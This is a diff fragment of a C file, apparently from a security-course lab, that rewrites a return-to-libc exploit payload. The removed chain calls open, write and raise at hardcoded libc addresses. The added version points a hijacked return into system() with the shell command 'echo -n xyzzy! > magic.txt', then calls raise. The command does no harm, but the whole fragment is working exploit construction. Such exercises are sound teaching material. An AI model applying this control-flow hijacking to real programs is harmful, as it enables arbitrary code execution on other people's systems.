@@ -23,24 +23,16 @@ unsigned char payload[] =
 	/* ------------------------------------	*/
 	/* FIXME */
 	/* ------------------------------------	*/
-	"\xf0\xea\xec\xb3" 					//<open> 0xb3eceaf0
-	"\x6d\xb8\xdf\xb3"  				//<return> 0001e86d +  0xb3dfa0f0 = 0xB3DFB86D
-	"\x50\xc3\xff\xbf" 					//<first param> 0xBFFFC350
-	"\x01\x00\x00\x00"					//<second param>
-	"\x00\x00\x00\x00"					//<third param>
-	"\x10\xf0\xec\xb3" 					//<write> 0xb3ecf010
-	"\x6d\xb8\xdf\xb3"					//<return>  0001e86d +  0xb3dfa0f0 = 0xB3DFB86D
-	"\x03\x00\x00\x0"					//<first param> 
-	"\x5a\xc3\xff\xbf"					//<second param> 0xBFFFC35A
-	"\x06\x00\x00\x00"					//<third param>
-	"\x40\x1d\xe1\xb3"					//<raise> 0xb3e11d40
-	"\x90\x90\x90\x90"
-	"\x0c\x00\x00\x00"					//<first param>
-	"magic.txt\x00" 					//0xBFFFC350
-	"xyzzy!\x00"; 						//0xBFFFC35A						
+	"\x40\x20\xe2\xb3" //0xb3e23040 <system> 0xb3e22040 0xb3e22040 0xb3e22040
+	"\x40\x1d\xe1\xb3" // 0xb3e12d40 <raise> 0xb3e11d40
+	"\x2c\xc3\xff\xbf" // <system arg> pointer to string 
 
+	"\x0c\x00\x00\x00"
+	 // <raise> argument
+	"echo -n xyzzy! > magic.txt";
 
 	/* ------------------------------------	*/
+
 
 
 int
